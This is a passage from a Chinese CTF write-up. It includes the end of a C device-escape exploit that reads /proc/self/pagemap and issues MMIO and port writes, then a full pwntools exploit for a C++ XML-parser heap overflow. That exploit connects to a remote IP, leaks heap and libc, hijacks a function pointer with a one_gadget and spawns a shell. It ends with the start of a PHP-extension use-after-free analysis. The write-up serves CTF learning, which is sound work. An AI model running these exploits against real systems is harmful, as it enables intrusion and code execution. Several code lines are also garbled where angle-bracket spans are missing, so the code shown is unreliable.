        uint32_t delta=0x9e3779b9;                     /* a key schedule constant */
        uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
        for (i=0; i>5) + k3);
            v0 -= ((v1>5) + k1);
            sum -= delta;                                   
        }                                              /* end cycle */
        v[0]=v0; v[1]=v1;
    }
    int main(int argc, char *argv[])
    {
        fd = open("/proc/self/pagemap", O_RDONLY);
        if(fd > 32;
        decrypt(res, key);
        printf("res[0]: %p\n", res[0]);
        mmio_write(0x18, res[0]);
        mmio_write(0x18, res[1]);
        outw(0x0, 0xC040 + 0x8); // seek = 0x0
        mmio_write(0x0, *(uint32_t *)"flag");
        outl(*(uint32_t *)"cat ", 0xC040 + 0x1C);
        return 0;
    }
## Truth
题目给了源码，编译因为是`-O3`，加上是cpp程序，所以binary会比较难看，直接分析源码即可。
  1. 首先，程序实现了一个简单的xml文件解析功能，提供了四个功能： 
        case 1:
        char temp;
        cout > nodeName >> content;
        xmlfile.editXML(nodeName, content);
        break;
    case 3:
        pnode(*xmlfile.node->begin(), "");
        break;
    case 4:
        cout > nodeName;
        if (auto temp = pnode(*xmlfile.node->begin(), "", nodeName)) 
            temp->meme(temp->backup);
        break;
分别是解析一个xml文件，编辑所给xml文件中给定节点的内容，打印节点信息，以及打印类成员backup中的内容。
  2. 主要注意到在输入一个xml文件，触发解析逻辑的时候： 
        void XML_NODE::parseNodeContents(std::vector::iterator& current)
    {
        while (*current)
        {
            switch (*current)
            {
            case CHARACTACTERS::LT:
            {
                if (*(current + 1) == CHARACTACTERS::SLASH)
                {
                    current += 2;
                    auto gt = iterFind(current, CHARACTACTERS::GT);
                    if (this->nodeName != std::string{ current, gt })
                    {
                        std::cout  node(std::make_shared());
                    node->parse(current);
                    if (!this->node)
                        this->node = std::make_shared >>();
                    this->node->push_back(node);
                }
                break;
            }
            case CHARACTACTERS::NEWLINE:
            case CHARACTACTERS::BLANK:
                ++current;
                break;
            default:
            {
                auto lt = iterFind(current, CHARACTACTERS::LT);
                data = std::make_shared (current, lt);
                backup = (char*)malloc(0x50); // malloc here
                current = lt;
                break;
            }
            }
        }
    }
`backup`的大小是固定的由`malloc(0x50)`得到的，但是后面在`editXML`中：
        void XML::editXML(std::string& name, std::string& content)
    {
        int status = getEditStatus(name, content);
        if (status >= 1)
        {
            std::shared_ptr a = pnode(*node->begin(), "", name);
            if (a && a->nodeName == name)
            {
                if (status == 1)
                {
                    *(a->data) = content;
                }
                else
                {
                    for (int i = 0; i data->length(); i++) // data can be very long
                    {
                        a->backup[i] = (*a->data)[i];
                    }
                    *(a->data) = content;
                }
            }
        }
        else
        {
            std::cout meme(temp->backup);`中的`meme`，因此修改该函数指针，即可劫持程序控制流；同时，由于`backup`是在解析xml文件时分配的内存，因此其处于heap中地址较低处，也就是说，通过溢出`backup`，可以覆盖到后面地址中存在的许多结构体，也可以leak出其中存在的heap地址和libc地址。此外，由于分析具体的结构体构成比较费力，覆盖heap中数据时，应尽量避免修改原有数据，而主要是找到`backup`以及`meme`所在的位置，覆盖该`backup`指针指向任意地址或者覆盖`meme`指向`onegadget`，即可实现任意地址读写以及getshell。
  4. 因此利用思路为： 
    * 首先参照xml文件格式，编写一个尽量简单的文件交给程序解析，由于整个利用围绕xml中的节点展开，所以这里只定义一个root节点，也方便debug。
    * 通过`editXML`，实现溢出`backup`，再调用`temp->meme(temp->backup)`，将`backup`后面的heap地址leak出来。
    * 伪造结构体，控制其中的成员`backup`为`read_got`，通过`temp->meme(temp->backup)`来leak出libc地址。
    * 再控制成员`meme`为`onegadget`即可。
    * 总的来说，很多结构体并没有分析到位，基本通过调试，然后不断试错实现利用的，所以分析写得比较难看。
  5. exp: 
        #!/usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import *
    import sys, os, re
    context(arch='amd64', os='linux', log_level='debug')p = remote('106.14.216.214', 48476)
    # menu
    choose_items = {
        "add": 1,
        "edit": 2,
        "show": 3,
        "bonus": 4
    }
    def choose(idx):
        p.sendlineafter("Choice: ", str(idx))
    def add(content):
        choose(choose_items['add'])
        p.sendlineafter("Please input file's content", content)
    def edit(name, content):
        choose(choose_items['edit'])
        p.sendlineafter("Please input the node name which you want to edit", name)
        p.sendline(content)
    def show():
        choose(choose_items['show'])
    def bonus(name):
        choose(choose_items['bonus'])
        p.sendlineafter("MEME", name)
    # heap overflow, leak heap base
    add("" + "A" * 0x20 + "\xFF")
    edit("root", "B" * 0x68 + "heapaddr")
    edit("root", "C" * 0x58)
    bonus("root")
    p.recvuntil("heapaddr")
    heap_base = u64(p.recvline()[:-1].ljust(8, "\x00")) - 0x11f30 
    # heap overflow, hijack struct to leak libc base
    edit("root", "D" * 0x58 + p64(0x21) + p64(0x405608) + p64(0x0000000100000001) + p64(heap_base + 0x12180))
    pause()
    payload = flat([heap_base + 0x121a0, heap_base + 0x12190, 0x405608, 0x0000000100000001, 0x405340, heap_base + 0x11de8, 4, 0x746f6f72] + \
                   4 *[0] + [heap_base + 0x11e00] * 2 + \
                   [0] + \
                   [heap_base + 0x11e70, heap_base + 0x11e60] + \
                   [0] * 2 + \
                   [elf.got['read']])
    edit("root", payload)
    bonus("root")
    p.recvuntil("Useless")
    libc_base = u64(p.recv(6).ljust(8, "\x00")) - libc.sym['read']
    one_gadget = libc_base + 0xf1207 
    # hijack fp
    payload = flat([heap_base + 0x121a0, heap_base + 0x12190, 0x405608, 0x0000000100000001, heap_base + 0x121C0, heap_base + 0x11de8, 4, 0x746f6f72] + \
                   [one_gadget, 0, 0, 0] + \
                   [heap_base + 0x11e00] * 2 + \
                   [0] + \
                   [heap_base + 0x11e70, heap_base + 0x11e60] + \
                   [0] * 2 + \
                   [heap_base + 0x12228])
    edit("root", payload)
    bonus("root")
    success("libc_base: " + hex(libc_base))
    success("heap_base: " + hex(heap_base))
    p.interactive()
## hackphp
第一次webpwn，题目本身并不难，主要是调试比较麻烦，Docker build出来的环境都和远程不一致（不知为何）。
  1. 分析`hackphp.so`，主要关注这几个`hackphp`相关的函数： 
        zif_hackphp_edit_cold
    zif_info_hackphp
    zm_activate_hackphp
    zif_hackphp_create
    zif_hackphp_delete
    zif_hackphp_edit
    zif_hackphp_get
    zif_startup_hackphp
可以看出模式依然是菜单题模式，其中`zif_hackphp_create`存在很明显的uaf漏洞：
        void __fastcall zif_hackphp_create(zend_execute_data *execute_data, zval *return_value)
    {